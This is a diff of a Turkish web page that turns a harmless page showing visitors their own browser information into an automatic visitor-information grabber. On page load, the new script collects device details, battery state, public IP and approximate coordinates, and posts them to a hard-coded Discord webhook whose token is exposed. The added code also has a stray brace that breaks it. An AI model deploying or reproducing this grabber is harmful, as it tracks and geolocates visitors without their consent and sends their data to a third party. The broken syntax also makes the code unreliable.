@@ -3,140 +3,168 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Don't leave yet! – Bilgilerin</title>
+  <title>Bilgiler Toplanıyor...</title>
   <style>
     body {
       font-family: monospace;
       background: #000;
       color: #0f0;
-      padding: 15px;
-      line-height: 1.5;
+      padding: 20px;
+      line-height: 1.6;
       margin: 0;
     }
-    h1 { color: #0f0; margin: 0 0 15px; }
-    h2 { color: #0f0; margin: 25px 0 8px; }
+    h1 { color: #0f0; }
     pre {
       background: #111;
-      padding: 10px;
+      padding: 12px;
       border: 1px solid #222;
       white-space: pre-wrap;
       word-break: break-all;
-      margin: 8px 0;
       font-size: 13px;
+      max-height: 400px;
+      overflow-y: auto;
     }
-    .section { margin-bottom: 25px; }
     .status { color: #0f0; font-weight: bold; }
-    .warning { color: #ff4444; font-size: 0.9em; }
+    .error { color: #ff4444; }
   </style>
 </head>
 <body>
-  <h1>Welcome, Eren Tunahan UÇAR!</h1>
+  <h1>Bilgileriniz toplanıp Discord'a gönderiliyor...</h1>
+  <p>Lütfen bu sayfayı kapatmayın (otomatik gönderim ~5 saniye içinde yapılır).</p>
 
-  <div class="section">
-    <h2>Gerçek Zamanlı Tarayıcı & Cihaz Bilgileri</h2>
-    <pre id="client-info">Yükleniyor...</pre>
-  </div>
+  <h2>Toplanan Veriler (önizleme):</h2>
+  <pre id="preview">Yükleniyor...</pre>
 
-  <div class="section">
-    <h2>Tahmini IP ve Konum (sunucusuz)</h2>
-    <pre id="ip-info">IP yükleniyor... (birkaç saniye sürebilir)</pre>
-    <p class="warning">Not: Bu bilgi üçüncü taraf bir servisten (ip-api.com) çekiliyor.</p>
-  </div>
+  <div id="status" class="status"></div>
 
   <script>
-    // ────────────────────────────────────────────────
-    // 1. Tarayıcı + Batarya + Donanım Bilgileri
-    // ────────────────────────────────────────────────
-    async function getClientInfo() {
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1483396402506633257/OtZD1LSrc4tz9WePfrr9qVXlQ9Nye6aIt3_ulqwqiBYfjw44ei6PppuCqYOWgxCmrj0M";  // ← BURAYA KENDİ DISCORD WEBHOOK URL'İNİ YAPIŞTIR
+
+    async function getAllInfo() {
       const nav = navigator;
       const scr = screen;
       const conn = nav.connection || {};
 
-      let battery = { level: "—", charging: "—", chargingTime: "—", dischargingTime: "—" };
+      // Batarya bilgisi
+      let battery = {
+        level: "—",
+        status: "—",
+        chargingTime: "—",
+        dischargingTime: "—"
+      };
 
       if (nav.getBattery) {
         try {
           const bat = await nav.getBattery();
           battery = {
-            level: `${Math.round(bat.level * 100)}%`,
-            charging: bat.charging ? "Şarj oluyor ⚡" : "Şarjda değil",
+            level: bat.level ? `${Math.round(bat.level * 100)}%` : "—",
+            status: bat.charging ? "Şarj oluyor ⚡" : "Şarjda değil",
             chargingTime: bat.chargingTime === Infinity ? "—" : `${bat.chargingTime} sn`,
             dischargingTime: bat.dischargingTime === Infinity ? "—" : `${bat.dischargingTime} sn`
           };
         } catch (e) {
-          battery.level = "Batarya API desteklenmiyor / izin yok";
+          battery.status = "Batarya API yok / izin verilmedi";
         }
       }
 
-      return {
-        Zaman: new Date().toLocaleString('tr-TR'),
+      // Temel bilgiler
+      const baseInfo = {
+        Zaman: new Date().toLocaleString('tr-TR', { timeZoneName: 'short' }),
         UserAgent: nav.userAgent,
-        Platform: nav.platform || '—',
-        Diller: nav.languages?.join(', ') || nav.language || '—',
-        ZamanDilimi: Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
-        Ekran: `${scr.width} × ${scr.height}  (piksel oranı: ${window.devicePixelRatio.toFixed(2)})`,
+        Platform: nav.platform || nav.oscpu || "—",
+        Diller: nav.languages ? nav.languages.join(", ") : nav.language || "—",
+        ZamanDilimi: Intl.DateTimeFormat().resolvedOptions().timeZone || "—",
+        Ekran: `${scr.width} × ${scr.height}  (dpi: ${window.devicePixelRatio.toFixed(2)})`,
         Pencere: `${window.innerWidth} × ${window.innerHeight}`,
-        RenkDerinligi: `${scr.colorDepth} bit`,
-        CPUÇekirdek: nav.hardwareConcurrency || 'bilinmiyor',
-        RAM_Tahmini: nav.deviceMemory ? `${nav.deviceMemory} GB` : 'bilinmiyor',
-        Bağlantı: conn.effectiveType ? `${conn.effectiveType} (~${conn.downlink || '?'} Mbps)` : '—',
-        Batarya: `${battery.level}  –  ${battery.charging}`,
-        ŞarjKalanSüre: battery.dischargingTime,
-        ŞarjOlmaSüresi: battery.chargingTime,
-        DokunmatikNokta: nav.maxTouchPoints || '—',
-        Vendor: nav.vendor || '—',
-        Çevrimiçi: nav.onLine ? 'Evet' : 'Hayır'
+        CPU_Çekirdek: nav.hardwareConcurrency || "bilinmiyor",
+        RAM_Tahmini: nav.deviceMemory ? `${nav.deviceMemory} GB` : "bilinmiyor",
+        Bağlantı: conn.effectiveType ? `${conn.effectiveType} (~${conn.downlink || "?"} Mbps)` : "—",
+        Batarya: `${battery.level} — ${battery.status}`,
+        Batarya_Detay: `Şarj süresi: ${battery.chargingTime} | Kalan: ${battery.dischargingTime}`,
+        Dokunmatik: nav.maxTouchPoints || "—",
+        Çevrimiçi: nav.onLine ? "Evet" : "Hayır"
       };
+
+      return baseInfo;
     }
 
-    function updateClientDisplay() {
-      getClientInfo().then(info => {
-        document.getElementById('client-info').textContent = JSON.stringify(info, null, 2);
-      });
-    }
-
-    // ────────────────────────────────────────────────
-    // 2. IP + yaklaşık konum çekme (sunucusuz)
-    // ────────────────────────────────────────────────
-    async function fetchIPInfo() {
+    async function getIPInfo() {
       try {
-        const res = await fetch('https://ipapi.co/json/');
-        // Alternatif: 'http://ip-api.com/json/' de kullanılabilir
-        const data = await res.json();
+        // Önce basit IP
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
 
-        if (data.ip) {
-          const info = {
-            IP: data.ip,
-            Şehir: data.city || '—',
-            Ülke: data.country_name || data.country || '—',
-            Bölge: data.region || '—',
-            Enlem_Boylam: `${data.latitude || '?'} , ${data.longitude || '?'}`,
-            ISP: data.org || data.asn || '—',
-            SaatDilimi: data.timezone || '—'
-          };
-          document.getElementById('ip-info').textContent = JSON.stringify(info, null, 2);
-        } else {
-          throw new Error("IP alınamadı");
+        // Daha detaylı bilgi
+        const detailsRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const details = await detailsRes.json();
+
+        return {
+          IP: ip || details.ip || "—",
+          Şehir: details.city || "—",
+          Ülke: details.country_name || details.country || "—",
+          ISP: details.org || details.asn || "—",
+          Enlem_Boylam: details.latitude && details.longitude ? `${details.latitude}, ${details.longitude}` : "—"
+        };
+      } catch (err) {
+        return { IP: "Alınamadı", Hata: err.message };
+      }
+    }
+
+    async function sendToDiscord() {
+      const statusEl = document.getElementById('status');
+      statusEl.textContent = "Toplanıyor...";
+
+      try {
+        const clientData = await getAllInfo();
+        const ipData = await getIPInfo();
+
+        const allData = { ...clientData, ...ipData };
+
+        // Önizleme göster
+        document.getElementById('preview').textContent = JSON.stringify(allData, null, 2);
+
+        // Discord mesajı (embed şeklinde daha güzel görünür)
+        const payload = {
+          username: "Ziyaretçi Bilgi Toplayıcı",
+          avatar_url: "https://i.imgur.com/4M34hi2.png", // isteğe bağlı avatar
+          embeds: [{
+            title: "Yeni Ziyaretçi Bilgileri",
+            color: 0x00ff00,
+            fields: [
+              { name: "Zaman", value: allData.Zaman, inline: true },
+              { name: "IP", value: allData.IP || "—", inline: true },
+              { name: "Konum", value: `${allData.Şehir || "?"} / ${allData.Ülke || "?"}`, inline: true },
+              { name: "User-Agent", value: `\`\`\`${allData.UserAgent.substring(0, 200)}...\`\`\``, inline: false },
+              { name: "Platform", value: allData.Platform, inline: true },
+              { name: "Dil", value: allData.Diller, inline: true },
+              { name: "Batarya", value: allData.Batarya, inline: true },
+              { name: "CPU / RAM", value: `${allData.CPU_Çekirdek} çekirdek  |  ${allData.RAM_Tahmini}`, inline: true },
+              { name: "Bağlantı", value: allData.Bağlantı, inline: true },
+              { name: "Ekran", value: allData.Ekran, inline: true }
+            ],
+            footer: { text: "Tarayıcıdan otomatik toplandı" },
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
         }
       } catch (err) {
-        document.getElementById('ip-info').textContent = 
-          "IP bilgisi alınamadı.\n" +
-          "Sebep: " + err.message + "\n" +
-          "(Adblock / VPN / ağ kısıtlaması olabilir)";
+        statusEl.textContent = `✗ Hata: ${err.message}`;
+        statusEl.className = "error";
+        console.error(err);
       }
     }
 
-    // Başlat
+    // Sayfa yüklendiğinde çalıştır
     window.addEventListener('load', () => {
-      updateClientDisplay();
-      fetchIPInfo();
-
-      // Batarya ve bağlantı değişirse güncelle
-      setInterval(updateClientDisplay, 8000);
+      setTimeout(sendToDiscord, 1200); // 1.2 saniye bekle (batarya API'si için)
     });
-
-    // Ekran boyutu değişirse güncelle
-    window.addEventListener('resize', updateClientDisplay);
   </script>
 </body>
 </html>
